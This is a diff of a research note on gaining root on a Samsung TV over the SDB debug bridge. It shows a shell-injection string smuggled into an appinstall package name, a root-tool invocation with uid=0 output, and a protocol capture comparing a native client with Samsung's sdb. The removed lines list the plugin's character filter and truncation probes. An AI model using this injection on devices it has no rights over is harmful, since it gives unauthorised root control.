@@ -1,83 +1,67 @@
-# SDB package-name foothold: tv-living blocker
+# Native SDB client vs Samsung `sdb` on tv-living
 
 Date: 2026-11-11
 Target: `T-PTMDEUC-REL-202602250226`, `sdbd 2.2.31`, plugin `3.8.5_TV_REL`
 
-## Observed behavior
+## Correction
 
-Both our native client and Samsung's `sdb` send the same service:
+The TV is **not** blocking the package-name foothold. The reference
+`samsung-tv-root` method still works on this unit:
+
+```console
+$ SDB=~/tizen-studio/tools/sdb .venv/bin/python -m samsung_tv_root \
+    --sdb ~/tizen-studio/tools/sdb qn90b root 172.17.2.110 --command 'id'
+...
+uid_after=0
+euid_after=0
+gid_after=0
+egid_after=0
+...
+uid=0(root) gid=0(root) ... context="User"
+[exit:0]
+```
+
+The same run also completes the compatibility preflight and stages the
+`qn90b31` payload on the .NET Core 3.1 CLR.
+
+## What fails
+
+Our native `tv-sdb` client sends what appears to be the same service:
 
 ```text
 shell:0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<base64>|base64${IFS}-d|bash`.tpk
 ```
 
-The daemon closes the channel immediately. Plain
-`0 appinstall tpk nonexistent.tpk` still reaches pkgcmd, so the transport and
-developer-mode authorization are working.
+but the TV replies with `CLSE` and our client reports
+`TV refused service "shell:0 appinstall tpk …"`.
 
-Character probes on the same TV:
+The exact reference argument, replayed through our native client, is also
+refused. Through Samsung's `sdb` the same argument runs.
 
-| Input | Result |
-|---|---|
-| plain `test.tpk` | pkgcmd runs |
-| backtick | service refused |
-| `$`, `$(...)` | service refused |
-| pipe / `<` / `>` / `&` | service refused |
-| `'` | service refused |
-| `;` | accepted by validation, but the package name is truncated at `;` |
-| `"` | reaches `/bin/sh -c`, but produces an unmatched-quote parse error |
-| `(`, `)` | reach the generated path, but produce a shell syntax error |
-| `\` | the package name is truncated at the backslash |
+## Captured difference
 
-## Why the reference payload fails here
-
-The exported `_verify_shell_cmd` in
-`/usr/lib/libsdbd_plugin.so` rejects `'`, `|`, `<`, `>`, `` ` ``, `&`, `$`,
-newline, carriage return, tab, `#`, `[`, `]`, `{` and `}`. The reference
-payload requires backticks and `$`.
-
-The accepted semicolon never survives conversion. Calling the plugin's
-`_convert_shell_cmd` directly on the TV produced:
+Through a local TCP proxy, Samsung's sdb server sends this sequence on one
+connection:
 
 ```text
-input:  0 appinstall tpk x;id;.tpk
-output: /usr/bin/pkgcmd -i -t tpk -p /home/owner/share/tmp/sdk_tools/x -q -G
+CNXN 0x100000 0x40000 host::
+OPEN capability:
+OKAY / CLSE
+OPEN shell:0 appinstall tpk new2.tpk`…`.tpk
 ```
 
-The name is truncated at the first `;`. Quotes show the same truncation, for
-example `x";/path/probe.sh;".tpk` converts to
-`.../sdk_tools/x" -q -G`; the resulting shell command has an unmatched quote.
-A backslash is also a truncation point. Parentheses are not truncation points
-but become shell syntax errors in the generated `pkgcmd` argument.
+Our native client sends the same `CNXN`, `capability:`, and shell service with
+the same payload bytes. The frame fields and service strings are byte-for-byte
+equivalent apart from channel IDs. Channel IDs were varied and did not change
+the result. The native client also succeeds for ordinary `shell:` verbs.
 
-The other appcmd shapes behave the same way:
+## Current conclusion
 
-```text
-0 vd_appinstall tpk x;id;          -> /usr/bin/wascmd -i tpk -p x
-0 appuninstall x;id;               -> ...;/usr/bin/pkgcmd -u -n x
-0 appinstall tpk /path/x;id;       -> .../pkgcmd -i -t tpk -p /path/x -q -G
-```
+The TV and sdbd plugin accept the reference injection. The failure is isolated
+to the native SDB client/session behavior, not the TV, package-name validation,
+or the FDET payload. The reference `qn90b root --command 'id'` result is the
+authoritative confirmation that the rooting phase works on `tv-living`.
 
-Every form truncates the user-controlled field at the first separator before
-the generated command is executed.
-
-## Conclusion
-
-The package-name injection is not usable on this unit with the installed
-`sdbd`/plugin. No safe validator bypass was found in the characters that pass
-`_verify_shell_cmd`; the remaining metacharacters either truncate the package
-name before it reaches the generated command or only produce shell parse
-errors.
-
-`tv-root` now runs a dedicated injection foothold probe before the
-compatibility fingerprint. On this TV it fails closed immediately with:
-
-```text
-SDB is connected, but the package-name shell injection is blocked by this TV's
-sdbd plugin (...); no root route can start
-```
-
-Restoring one-shot FDET root requires either a build whose sdbd plugin accepts
-the injection characters, a different reviewed acquisition route, or an
-operator-controlled downgrade of that daemon. Do not weaken the validation or
-persistence guards to work around it.
+Further work should compare the Samsung sdb server's device transport/session
+state with a direct native connection, rather than treating the TV as blocked.
+Do not weaken TV-side validation or persistence guards while doing so.
